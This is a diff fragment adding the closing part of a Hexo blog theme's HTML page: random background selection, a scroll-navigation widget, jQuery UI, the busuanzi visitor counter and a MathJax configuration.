+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 4;
+                var backgroundimg = "url(http://qn.lazysheep.cc/bg/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+    <script src="//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js"></script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
